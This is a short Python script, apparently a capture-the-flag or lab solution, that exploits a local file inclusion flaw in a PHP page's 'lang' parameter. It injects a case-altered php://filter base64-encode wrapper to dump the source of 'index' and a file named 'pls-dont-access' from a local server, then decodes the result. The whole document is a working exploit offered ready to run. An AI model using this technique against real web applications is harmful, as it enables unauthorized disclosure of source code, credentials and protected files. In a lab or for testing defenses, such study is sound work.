#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import base64

def file (path):
    payload = 'pHp://FilTer/convert.base64-encode/resource=' + path
    
    r = requests.get('http://127.0.0.1:8888/index.php?lang=' + payload)
    soup =BeautifulSoup(r.text,"html.parser")
    print(base64.b64decode(soup.find('p').text).decode('utf8'))
file("index")
file("pls-dont-access")